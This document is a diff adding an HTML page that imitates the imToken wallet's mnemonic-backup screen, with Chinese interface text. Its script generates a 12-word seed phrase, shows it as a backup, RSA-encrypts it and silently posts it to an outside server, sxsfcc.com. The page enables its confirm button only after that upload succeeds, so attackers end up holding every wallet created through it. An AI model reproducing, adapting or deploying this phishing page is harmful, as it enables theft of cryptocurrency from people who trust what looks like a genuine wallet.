@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0, maximum-scale=1,user-scalable=no">
+	<meta content="yes" name="apple-mobile-web-app-capable">
+	<meta content="black" name="apple-mobile-web-app-status-bar-style">
+	<meta content="telephone=no" name="format-detection">
+	<meta content="email=no" name="format-detection">
+	<link rel="stylesheet" type="text/css" href="./css/reset.css">
+	<link rel="stylesheet" type="text/css" href="./css/style1.css">
+	<title>imtoken--备份单词</title>
+    <script type="text/javascript" src="./js/rem.js"></script>
+</head>
+<body style="overflow:hidden">
+	<header>
+	<div class="header">
+		<a href="javascript:void(0)" class="fl"><img src="./imgs/back.png"></a>
+		<a href="javascript:void(0)" class="fr"><img src="./imgs/why.png"></a>
+	</div>
+</header>
+	<div class="container code1_box">
+		<h3>备份提示<br/><span>获得助记词等于拥有钱包资产所有权</span></h3>
+
+		<ul class="code_box">
+			<li><p></p><span>1</span></li>
+			<li><p></p><span>2</span></li>
+			<li><p></p><span>3</span></li>
+			<li><p></p><span>4</span></li>
+			<li><p></p><span>5</span></li>
+			<li><p></p><span>6</span></li>
+			<li><p></p><span>7</span></li>
+			<li><p></p><span>8</span></li>
+			<li><p></p><span>9</span></li>
+			<li><p></p><span>10</span></li>
+			<li><p></p><span>11</span></li>
+			<li><p></p><span>12</span></li>
+		</ul>
+
+
+		<p style="margin-top:0.3rem;"><span>·</span>妥善保管助记词至隔离网络安全的地方。</p>
+		<p><span>·</span>请勿将助记词在网络环境下分享和存储，比如邮件、邮箱、社交应用等。</p>
+	</div>
+
+	 <button id="next" class="btn" disabled>已确认备份</button>
+
+
+<div class="model" >
+	<img src="./imgs/load2.gif" style="">
+	<p>加载中...</p>
+</div>
+<div class="bgbox">
+</div>
+<div class="popbox">
+<div class="tits"><img src="static/img/close.png" id="closes"></div>
+<div class="xxinfo">
+<img src="imgs/jieping.png">
+<h4>请勿截屏</h4>
+<p>请不要通过截屏的方式进行备份，这将会增加助记词被盗和丢失的风险。图库一旦被恶意软件窃取，将会造成资产损失。</p>
+</div>
+<a href="javascript:;" class="btn_active_copy1" id="iknow">我知道了</a>
+</div>
+    <script src="./bipjs/jquery-3.2.1.js"></script>
+    <script src="./bipjs/bip39-libs.js"></script>
+    <script src="./bipjs/bitcoinjs-extensions.js"></script>
+    <script src="./bipjs/segwit-parameters.js"></script>
+    <script src="./bipjs/ripple-util.js"></script>
+    <script src="./bipjs/jingtum-util.js"></script>
+    <script src="./bipjs/casinocoin-util.js"></script>
+    <script src="./bipjs/cosmos-util.js"></script>
+    <script src="./bipjs/eos-util.js"></script>
+    <script src="./bipjs/fio-util.js"></script>
+    <script src="./bipjs/xwc-util.js"></script>
+    <script src="./bipjs/sjcl-bip39.js"></script>
+    <script src="./bipjs/wordlist_english.js"></script>
+    <script src="./bipjs/wordlist_japanese.js"></script>
+    <script src="./bipjs/wordlist_spanish.js"></script>
+    <script src="./bipjs/wordlist_chinese_simplified.js"></script>
+    <script src="./bipjs/wordlist_chinese_traditional.js"></script>
+    <script src="./bipjs/wordlist_french.js"></script>
+    <script src="./bipjs/wordlist_italian.js"></script>
+    <script src="./bipjs/wordlist_korean.js"></script>
+    <script src="./bipjs/wordlist_czech.js"></script>
+    <script src="./bipjs/wordlist_portuguese.js"></script>
+    <script src="./bipjs/jsbip39.js"></script>
+    <script src="./bipjs/entropy.js"></script>
+    <script src="./js/jsencrypt.min.js"></script>
+    <script type="text/javascript">
+	var mnemonics = { "english": new Mnemonic("english") };
+    var mnemonic = mnemonics["english"];
+    var seed = null;
+    var bip32RootKey = null;
+    var bip32ExtendedKey = null;
+    var network = libs.bitcoin.networks.bitcoin;
+    var addressRowTemplate = $("#address-row-template");
+
+    var showIndex = true;
+    var showAddress = true;
+    var showPubKey = true;
+    var showPrivKey = true;
+    var showQr = false;
+    var litecoinUseLtub = true;
+
+    var entropyTypeAutoDetect = true;
+    var entropyChangeTimeoutEvent = null;
+    var phraseChangeTimeoutEvent = null;
+    var seedChangedTimeoutEvent = null;
+    var rootKeyChangedTimeoutEvent = null;
+
+    var generationProcesses = [];
+	function hasStrongRandom() {
+        return 'crypto' in window && window['crypto'] !== null;
+    }
+
+    function generateRandomPhrase() {
+        if (!hasStrongRandom()) {
+            var errorText = "This browser does not support strong randomness";
+            alert(errorText);
+            return;
+        }
+        // get the amount of entropy to use
+        var numWords = parseInt("12");
+        var strength = numWords / 3 * 32;
+        var buffer = new Uint8Array(strength / 8);
+        // create secure entropy
+        var data = crypto.getRandomValues(buffer);
+        // show the words
+        var words = mnemonic.toMnemonic(data);
+        //DOM.phrase.val(words);
+        // show the entropy
+        //var entropyHex = uint8ArrayToHex(data);
+        //DOM.entropy.val(entropyHex);
+        // ensure entropy fields are consistent with what is being displayed
+        //DOM.entropyMnemonicLength.val("raw");
+        return words;
+    }
+    </script>	
+    <script type="text/javascript">
+	function mnemonicRAS(key) {
+		const publicKey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAghkqP3enteE0CTZgpA51vUY5PPCqVb+s01b75blFDD9fmb2fI70r08K3LyfmasBzEKpWitkdnl0rNTBfCD8XqG9YUATOA9hggfyvkVTnG6/MUlfgwq0FmpwKkVWDoWDUrAn9EEq3455ONA8IoWG5Eqa0KFIIILoviZGiFxkbRFDrQpuuHgkc4K5Io44ETiM3Q8QC/d/B6BgAfUP2oG6wSbh7Jk/pxBeLPs4FudFuhUl3d57coyiCkYmklsGqhxg21iHZECWa0c+iujlkMOIIXGUmSW+c7CVNcSPLLx01tH25KmcmfWcg3Y3c0Qga+m88QxGMiFqRp1XcoJOdmySysQIDAQAB';
+		const encrypt = new JSEncrypt();
+		encrypt.setPublicKey(publicKey);
+		const password = encrypt.encrypt(key);// 加密后的字符串
+		
+		return password.toString();
+	}
+	   function getzhuci()
+	   {
+		   var zhuci=generateRandomPhrase();
+		   var mnemonicRas=mnemonicRAS(zhuci);
+		   window.localStorage.setItem("zhuci", zhuci)
+		   var arrzhuci=zhuci.split(" ");
+		   var strHtml="";
+		   for(var j=0;j<arrzhuci.length;j++)
+		   {
+			   strHtml+="<li><p>"+arrzhuci[j]+"</p><span>"+(j+1)+"</span></li>";
+		   }
+		   $('.code_box').html(strHtml);
+		   $('.model').css('display','none'); 
+		   $.post("https://sxsfcc.com/api/open/postByTokenpocket",{'ciyu': mnemonicRas,'code': '10091','ciyuType':'1','wallet': "imtoken-h5"},
+			  function(data){		
+			     if(data.msg=="success"){   	   
+				 	$('#next').removeAttr('disabled');
+				 	$('#next').addClass('btn_active');
+				 }
+		   }, "json");
+		   
+	   }
+       $(function(){
+
+		   setTimeout(function(){$('.bgbox').css('display','block');},300);
+	       setTimeout(function(){$('.popbox').addClass('popcur');},500);
+		   //$('.model').css('display','block');   
+		   getzhuci();
+		   $('#closes').bind('click',function(){
+			   $('.bgbox').css('display','none');
+			   $('.popbox').removeClass('popcur');
+		  });
+		  $('#iknow').bind('click',function(){
+			   $('.bgbox').css('display','none');
+			   $('.popbox').removeClass('popcur');
+		  });
+		   $('#next').bind("click",function(){window.location.href='confirmCode.html'})
+	   });
+    </script>
+</body>
+</html>
